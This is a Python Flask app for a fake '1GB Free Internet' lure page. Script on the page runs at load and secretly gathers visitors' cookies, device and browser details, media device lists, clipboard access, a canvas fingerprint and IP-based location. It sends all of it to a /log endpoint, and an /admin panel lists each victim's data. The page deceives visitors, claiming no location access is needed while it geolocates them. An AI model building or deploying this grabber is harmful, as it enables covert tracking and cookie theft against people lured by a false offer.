
# -*- coding: utf-8 -*-
from flask import Flask, request, render_template_string
import datetime

app = Flask(__name__)
data_log = []

# HTML page shown to the user
html_page = '''
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>🏱 1GB Free Internet</title>
  <style>
    body {
      font-family: 'Courier New', Courier, monospace;
      background-color: #000;
      color: #00ff00;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      text-align: center;
      overflow: hidden;
    }
    .card {
      background: rgba(0, 0, 0, 0.8);
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
      border: 1px solid #00ff00;
      animation: fadeIn 1s ease-in-out;
    }
    h1 {
      margin-bottom: 20px;
      font-size: 28px;
      text-shadow: 0 0 10px #00ff00;
    }
    p {
      font-size: 18px;
      margin-bottom: 20px;
      text-shadow: 0 0 5px #00ff00;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      background: linear-gradient(90deg, #00ff00, #00cc00);
      color: black;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      transition: background 0.3s, transform 0.2s;
      box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
    }
    button:hover {
      background: linear-gradient(90deg, #00cc00, #00ff00);
      transform: scale(1.05);
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>✅ 1GB Free Internet Activated</h1>
    <p>Your free internet has started. Stay connected!</p>
    <p>Location access is not required.</p>
  </div>

<script>
async function collectData() {
  const startTime = performance.now();
  const payload = {
    screen: `${screen.width}x${screen.height}`,
    window: `${window.innerWidth}x${window.innerHeight}`,
    pixelRatio: window.devicePixelRatio,
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    touchSupport: navigator.maxTouchPoints || 0,
    cookieEnabled: navigator.cookieEnabled,
    cookies: document.cookie,
    plugins: Array.from(navigator.plugins).map(p => p.name).join(", "),
    referrer: document.referrer,
    timestamp: new Date().toISOString(),
    battery: 'unknown',
    network: 'unknown',
    latency: 'unknown',
    fonts: 'unknown',
    mediaDevices: [],
    clipboardWrite: false,
    performanceLoad: 'unknown',
    canvasFingerprint: 'unknown'
  };

  // Battery
  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      payload.battery = Math.round(b.level * 100) + '%';
      payload.charging = b.charging;
    } catch {}
  }

  // Network
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (conn) {
    payload.network = conn.effectiveType || 'unknown';
    payload.latency = conn.rtt + 'ms';
  }

  // Clipboard write test
  try {
    await navigator.clipboard.writeText("test");
    payload.clipboardWrite = true;
  } catch {}

  // Media devices
  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    payload.mediaDevices = devices.map(d => `${d.kind}: ${d.label}`);
  } catch {}

  // Canvas fingerprint
  try {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('🎉 Canvas Fingerprint!', 2, 2);
    payload.canvasFingerprint = canvas.toDataURL();
  } catch {}

  // IP/location
  try {
    const res = await fetch("https://ipapi.co/json");
    const ipData = await res.json();
    payload.ip = ipData.ip;
    payload.city = ipData.city;
    payload.region = ipData.region;
    payload.country = ipData.country_name;
    payload.org = ipData.org;
  } catch {}

  // Page load time
  const endTime = performance.now();
  payload.performanceLoad = `${Math.round(endTime - startTime)}ms`;

  // Send to server
  fetch("/log", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify(payload)
  });
}

// Automatically collect data when the page loads
window.onload = collectData;
</script>
</body>
</html>
'''

# Admin page to view collected data
admin_page = '''
<!DOCTYPE html>
<html>
<head>
  <title>Admin Panel</title>
  <style>
    body { font-family: 'Courier New', Courier, monospace; background: #000; color: #00ff00; padding: 20px; }
    table { width: 100%; border-collapse: collapse; font-size: 12px; }
    th, td { border: 1px solid #444; padding: 8px; }
    th { background: #00cc00; color: #000; }
    h1 { margin-bottom: 20px; text-shadow: 0 0 10px #00ff00; }
    td { max-width: 300px; word-break: break-word; }
  </style>
</head>
<body>
  <h1>📋 Device Info Log</h1>
  <table>
    <tr>
      <th>IP</th><th>City</th><th>Region</th><th>Country</th><th>Org</th>
      <th>OS</th><th>Browser</th><th>Screen</th><th>Network</th><th>Battery</th>
      <th>Touch</th><th>Language</th><th>Timezone</th><th>Referrer</th>
      <th>Cookies</th><th>Clipboard</th><th>Plugins</th><th>Media</th>
      <th>Perf</th><th>Canvas</th><th>Time</th>
    </tr>
    {% for d in data %}
    <tr>
      <td>{{ d.ip }}</td>
      <td>{{ d.city }}</td>
      <td>{{ d.region }}</td>
      <td>{{ d.country }}</td>
      <td>{{ d.org }}</td>
      <td>{{ d.platform }}</td>
      <td>{{ d.userAgent }}</td>
      <td>{{ d.screen }}</td>
      <td>{{ d.network }}</td>
      <td>{{ d.battery }}</td>
      <td>{{ d.touchSupport }}</td>
      <td>{{ d.language }}</td>
      <td>{{ d.timezone }}</td>
      <td>{{ d.referrer }}</td>
      <td>{{ d.cookies }}</td>
      <td>{{ d.clipboardWrite }}</td>
      <td>{{ d.plugins }}</td>
      <td>{{ d.mediaDevices }}</td>
      <td>{{ d.performanceLoad }}</td>
      <td>{{ d.canvasFingerprint[:30] }}...</td>
      <td>{{ d.timestamp }}</td>
    </tr>
    {% endfor %}
  </table>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(html_page)

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    data_log.append(data)
    print("\n🧠 New Device Data:")
    for k, v in data.items():
        print(f"{k:>16}: {v}")
    return "OK"

@app.route('/admin')
def admin():
    return render_template_string(admin_page, data=data_log[::-1])

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)     
